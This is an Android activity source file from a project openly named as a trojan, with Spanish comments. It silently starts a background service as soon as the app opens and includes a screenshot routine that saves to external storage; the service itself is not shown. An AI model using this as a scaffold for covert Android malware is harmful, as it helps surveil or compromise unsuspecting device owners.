package trojan.android.android_trojan.activity;

/*Librerias*/
import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;

/*Excepciones*/
import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;

/*Clases y archivos necesarios*/
import trojan.android.android_trojan.action.BackgroundService;
import trojan.android.android_trojan.R;


public class MainActivity extends Activity {

    private Button button3;
    private Button button4;
    private Button btnTakeScreenshot;
    private static final String TAG = "MainActivity";
    private String result = null;


    /*Al iniciarse la aplicacion se ejecutara el siguiente codigo*/
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        /*Indicamos que aparte del codigo de oncreate, en adicion,  usaremos el nuestro */
        super.onCreate(savedInstanceState);
        /*Indicamos el layout que veremos al iniciar*/
        setContentView(R.layout.activity_main);

        /*Iniciaremos el servicio en cuanto se abra la aplicación*/
        startService(new Intent(MainActivity.this, BackgroundService.class));

        /*Creacion botones para el manejo de los servicios*/
        button3 = (Button) findViewById(R.id.start_service);
        button4 = (Button) findViewById(R.id.stop_service);
        btnTakeScreenshot= (Button) findViewById(R.id.btnTakeScreenshot);

        /*Listeners para los botones */
        /*Screenshot*/
        btnTakeScreenshot.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                takeScreenshot();
            }
        });

        /*Iniciar o parar el servicio mandan a llamar a backgroundService*/
        /*Inicir servicio*/
        button3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startService(new Intent(MainActivity.this, BackgroundService.class));
            }
        });

        /*Parar servicio*/
        button4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                stopService(new Intent(MainActivity.this, BackgroundService.class));
            }
        });
    }

    /*Codigo para capturar un screenshot*/
    public void takeScreenshot()
    {
        /*Formato de hora*/
        Date now = new Date();
        android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);

        /**/
        try
        {
            /* Path donde se guardara la imagen*/
            String mPath = Environment.getExternalStorageDirectory().toString() + "/PICTURES/Screenshots/h.jpg";

            /*Se toma la vista que se capturara*/
            View v1 = getWindow().getDecorView().getRootView();
            v1.setDrawingCacheEnabled(true);
            /*Se toma el bitmap*/
            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
            v1.setDrawingCacheEnabled(false);
            /*Se crea el archivo*/
            File imageFile = new File(mPath);
            FileOutputStream outputStream = new FileOutputStream(imageFile);
            int quality = 100;
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
            outputStream.flush();
            outputStream.close();

            MediaScannerConnection.scanFile(this,
                    new String[]{imageFile.toString()}, null,
                    new MediaScannerConnection.OnScanCompletedListener() {
                        public void onScanCompleted(String path, Uri uri) {
                            Log.i("ExternalStorage", "Scanned " + path + ":");
                            Log.i("ExternalStorage", "-> uri=" + uri);
                        }
                    });
        } catch (Throwable e) { e.printStackTrace(); }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
